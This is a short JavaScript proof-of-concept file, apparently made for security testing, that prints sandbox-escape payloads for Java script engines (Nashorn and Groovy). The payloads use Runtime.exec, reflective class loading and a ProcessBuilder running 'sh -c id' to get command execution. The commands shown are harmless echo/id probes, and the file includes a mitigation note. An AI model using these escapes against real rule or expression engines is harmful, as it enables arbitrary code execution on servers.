/*
  Safe PoC -> x8bitranjit
  INERT BY DESIGN: this file only PRINTS the escape payloads.

  WHAT THIS DEMONSTRATES: Java ScriptEngine (Nashorn/Groovy) sandbox escapes -
  the engine behind 'business rule' / 'expression' features on Java stacks.
  Mitigation note: Nashorn removed in JDK15+; `--no-java` restricts bindings.
*/
console.log("== nashorn: Java.type (default bindings) ==");
console.log(String.raw`
  var Runtime = Java.type('java.lang.Runtime');
  Runtime.getRuntime().exec('echo Safe PoC -> x8bitranjit');
`);
console.log("== nashorn: reflective when Java.type is stripped ==");
console.log(String.raw`
  var s = java.lang.Class.forName('java.lang.Runtime') ...
  # or via BC: this.engineFactory.getClass()... walk to ClassLoader
`);
console.log("== groovy template/engine ==");
console.log(String.raw`
  'echo Safe PoC -> x8bitranjit'.execute().text
  new ProcessBuilder(['sh','-c','id']).start().text
`);
console.log("== Benign rule: single echo/id; capture via response or OOB placeholder ==");
